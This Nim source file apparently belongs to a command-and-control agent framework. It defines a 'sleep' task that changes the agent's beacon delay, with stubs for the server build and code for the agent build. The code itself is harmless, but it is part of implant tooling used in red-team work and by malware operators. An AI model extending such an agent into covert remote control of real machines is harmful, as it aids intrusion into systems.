import ./manager
import ../common/[types, utils]

# Define function prototype
proc executeSleep(config: AgentConfig, task: Task): TaskResult 

# Command definition (as seq[Command])
let commands* = @[
    Command(
        name: "sleep",
        commandType: CMD_SLEEP,
        description: "Update sleep delay configuration.",
        example: "sleep 5",
        arguments: @[
            Argument(name: "delay", description: "Delay in seconds.", argumentType: INT, isRequired: true)
        ],
        execute: executeSleep
    )
]

# Implement execution functions
when defined(server):
    proc executeSleep(config: AgentConfig, task: Task): TaskResult = nil

when defined(agent): 

    import os, strutils, strformat
    import ../agent/core/taskresult

    proc executeSleep(config: AgentConfig, task: Task): TaskResult = 

        try: 
            # Parse task parameter
            let delay = int(task.args[0].data.toUint32())

            echo fmt"   [>] Sleeping for {delay} seconds."
            
            sleep(delay * 1000) 
        
            # Updating sleep in agent config
            config.sleep = delay
            return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
